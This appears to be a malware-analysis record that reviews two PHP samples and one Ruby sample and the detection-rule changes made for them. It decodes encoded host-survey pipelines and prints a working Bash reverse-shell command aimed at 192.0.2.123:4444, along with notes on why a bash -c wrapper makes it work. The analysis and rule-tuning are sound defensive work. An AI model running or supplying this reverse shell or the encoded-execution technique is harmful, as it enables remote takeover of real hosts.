samples.identification: PHP host-survey launcher with explicit Bash command wrapper
execution_trace: At top level, PHP system() executes echo of a Base64 literal piped through openssl enc -base64 -d -A into sh.
The decoded commands are id; whoami; hostname; uname -a; cat /etc/os-release. Output goes to the inherited output stream; no separate exfiltration operation is present.
An unconditional second system() call runs bash -c with an interactive Bash command redirecting stdout and stderr to /dev/tcp/192.0.2.123/4444, then duplicates that socket-backed stdout onto stdin.
The explicit Bash wrapper ensures Bash interprets the TCP redirection rather than relying on the system default shell to support it.
samples.marker: PHP wrapped stage: host survey + reverse-shell attempt; traits fixed

execution_trace: The only top-level operation is Kernel.system with a single command string containing a shell pipeline.
echo outputs the hex literal; xxd -r -p decodes it; the result is piped to a new Bash interpreter.
Decoded bytes are bash -i >& /dev/tcp/192.0.2.123/4444 0>&1. Bash opens the outbound TCP socket and attaches interactive shell standard streams to it.
Ruby syntax checking passed. A harness overriding system intercepted the exact pipeline, confirming the top-level call without running its shell or opening a connection.
samples.marker: Ruby hex stage: executes encoded reverse shell; traits corrected

samples.identification: PHP host-survey launcher with direct reverse-shell command
execution_trace: The first top-level system() executes the same OpenSSL Base64-to-sh host survey as the wrapped PHP variant.
The second system() directly passes bash -i >& /dev/tcp/192.0.2.123/4444 0>&1 to the default system shell.

The intended result is an outbound interactive shell. Actual success requires the shell interpreting the redirections to support this Bash syntax; a default shell such as dash may reject it before Bash is launched.
Failure or shell incompatibility does not negate the statically established reverse-shell attempt.
samples.marker: PHP direct stage: host survey + reverse-shell attempt; traits fixed

judgment_context: Each file is executable launcher code, with no request authentication, harness, labeled testing context, or legitimate application surrounding it. Passing shell I/O to a configured outbound socket tips the judgment. The documentation-range IP suggests synthetic or demonstration payloads; authorization, original source, and actual deployment are unknown. No connection or runtime compromise was observed or attempted during review.
hostile_coverage_limit: The two existing hostile findings on each sample both describe reverse-shell access, one supported hostile behavior. Concealed pipeline execution is suspicious; ordinary host queries are notable. No independent second hostile result is established, so no duplicate or invented hostile objective was added.
changes: Added notable, shell-boundary hostname and uname -a command-text observations. Text matching includes decoded command layers, which do not always retain parsed call facts.

Relocated os-release-read from platform/arch to platform/files, preserving matcher, effective file/platform scope, severity, and exclusion. No exact-ID consumers existed. The arch-detection directory consumer should not count distro identification as CPU architecture; broader sysinfo selectors still include the observation.

Preserved the original xxd-to-shell matcher as a notable process/create/shell/pipeline capability. The suspicious anti-static finding now binds an inline echo/printf hex literal to xxd and a shell sink in one matcher, rather than treating all decoder transport as concealment.

Relocated and accurately renamed the quoted identifier echo fragment from process/create/shell/pipeline to process/io/stream, preserving its matcher and effective scope. Updated its exact Python profile consumer. This is a stream fragment, not evidence of creating a shell. Broad process-creation consumers no longer receive that incomplete stream fragment.
No trait severities were tuned to change classifier scores; existing supported reverse-shell, execution, decoding, stdio and stream findings were retained.
